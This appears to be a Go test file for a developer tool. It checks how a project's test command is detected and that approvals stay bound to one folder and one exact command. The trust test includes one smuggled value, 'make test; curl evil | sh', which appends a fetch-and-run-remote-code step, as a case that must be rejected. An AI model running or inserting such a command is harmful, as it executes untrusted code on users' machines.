package main

import (
	"os"
	"path/filepath"
	"testing"
)

func write(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestCheckCommandDetection(t *testing.T) {
	cases := []struct {
		files     map[string]string
		cmd, from string
	}{
		{map[string]string{".roost-check": "# lint and test\n\nmake lint test\n", "go.mod": "module x"}, "make lint test", ".roost-check"},
		{map[string]string{".roost-check": "# only a comment\n"}, "", ".roost-check"},
		{map[string]string{"Makefile": "build:\n\tgo build\ntest:\n\tgo test\n", "go.mod": "module x"}, "make test", "Makefile"},
		{map[string]string{"Makefile": "build:\n\tgo build\n", "go.mod": "module x"}, "go test ./...", "go.mod"},
		{map[string]string{"Cargo.toml": "[package]"}, "cargo test", "Cargo.toml"},
		{map[string]string{"package.json": `{"scripts":{"test":"vitest run"}}`}, "npm test --silent", "package.json"},
		{map[string]string{"package.json": `{"scripts":{"test":"echo \"Error: no test specified\" && exit 1"}}`}, "", ""},
		{map[string]string{"README.md": "hi"}, "", ""},
	}
	for i, c := range cases {
		dir := t.TempDir()
		for n, b := range c.files {
			write(t, dir, n, b)
		}
		if cmd, from := checkCommand(dir); cmd != c.cmd || from != c.from {
			t.Errorf("case %d: got (%q, %q), want (%q, %q)", i, cmd, from, c.cmd, c.from)
		}
	}
}

func TestCheckTrust(t *testing.T) {
	t.Setenv("ROOST_HOME", t.TempDir())
	root := "/work/api"
	if isTrusted(root, "make test") {
		t.Fatal("trusted before approval")
	}
	if err := setTrust(root, "make test", true); err != nil {
		t.Fatal(err)
	}
	if !isTrusted(root, "make test") {
		t.Fatal("not trusted after approval")
	}
	if isTrusted(root, "make test; curl evil | sh") || isTrusted("/work/other", "make test") {
		t.Fatal("approval must be tied to the exact folder and command")
	}
	setTrust(root, "make lint test", true) // command changed and re-approved
	if isTrusted(root, "make test") || !isTrusted(root, "make lint test") {
		t.Fatal("re-approval should replace the old command")
	}
	setTrust(root, "make lint test", false)
	if isTrusted(root, "make lint test") {
		t.Fatal("deny should revoke")
	}
	if fi, err := os.Stat(checksAllowPath()); err != nil || fi.Mode().Perm() != 0o600 {
		t.Fatalf("approvals file should be 0600: %v %v", fi.Mode(), err)
	}
}
